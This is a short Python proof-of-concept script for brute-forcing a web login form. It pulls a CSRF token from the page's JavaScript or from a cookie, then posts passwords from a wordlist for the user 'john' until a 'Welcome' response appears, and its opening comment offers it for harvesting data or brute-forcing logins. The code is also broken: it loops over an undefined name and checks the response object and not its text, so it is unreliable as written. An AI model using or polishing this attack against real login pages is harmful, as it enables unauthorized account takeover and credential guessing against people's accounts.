# Proof of Concept Python code to extract CSRF token from an HTTP response 
# After tailoring to the web application the code can be used to harvest data or brute-force login forms.

import sys
import requests
import re

URL = 'https://10.10.10.1/login'
uname = "john"

client = requests.session()
response = client.post(URL)

lines = open('passwords.txt')
for pw in line:
  # Case 1: Read token from the JavaScript code
  csrf_pattern = 'csrfToken = "(.*?)"'
  token = re.findall(csrf_pattern, response.text)[0]
  # Case 2: Read token from cookie
  token =  client.cookies['csrftoken']
  # Submitting the request:
  login_data = dict(username=uname, password=pw, csrf_token=token)
  response = client.post(URL, data=login_data, headers=dict(Referer=URL))
  # Read response
  if "Welcome" in response:
    print("+ Login success with %s:%s" % (uname,pw))
    break
  # Clear cookies if necessary
  client.cookies.clear()
